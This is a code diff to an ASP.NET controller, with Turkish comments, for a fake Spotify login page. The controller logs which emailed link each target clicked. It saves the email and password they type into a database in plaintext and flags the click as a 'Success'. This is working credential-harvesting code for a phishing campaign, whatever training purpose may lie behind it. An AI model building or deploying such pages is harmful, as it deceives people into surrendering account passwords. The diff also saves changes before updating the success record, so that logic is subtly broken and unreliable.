@@ -16,21 +16,27 @@ namespace WebApplicationProject.Controllers
             _context = context;
             _logger = logger;
         }
+        public IActionResult Page()
+        {
+            return View("~/Views/SpotifyLogin/SpotifyLogin.cshtml");
+        }
         public IActionResult Index(int EmailId)
         {
             ViewBag.EmailId = EmailId;
 
 
-            // Veritabanına ekleme işlemi
-            var clicked = new ClickedMail
+            var existingClickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
+            if (existingClickedMail == null) // Eğer böyle bir kayıt yoksa ekleme işlemi yap
             {
-                EmailId = EmailId, // Örnek olarak fname'i Email alanına atadım
-                Date = DateTime.Now,// Örnek olarak lname'i Password alanına atadım
-                Success = false
-            };
-
-            _context.Add(clicked);
-            _context.SaveChanges();
+                var clicked = new ClickedMail
+                {
+                    EmailId = EmailId,
+                    Date = DateTime.Now,
+                    Success = false
+                };
+                _context.Add(clicked);
+                _context.SaveChanges();
+            }
             return View("~/Views/SpotifyLogin/SpotifyLogin.cshtml");
         }
 
@@ -44,14 +50,15 @@ namespace WebApplicationProject.Controllers
                 // Veritabanına ekleme işlemi
                 var SpotifyLogin = new SpotifyLogin
                 {
-                    Email = Email, // Örnek olarak fname'i Email alanına atadım
-                    Password = Password // Örnek olarak lname'i Password alanına atadım
+                    Email = Email, 
+                    Password = Password 
                 };
                 var clickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
                 clickedMail.Success = true;
                 _context.Add(SpotifyLogin);
-                _context.Update(clickedMail);
                 await _context.SaveChangesAsync();
+                _context.Update(clickedMail);
+
                 return View("Index");
             }
 
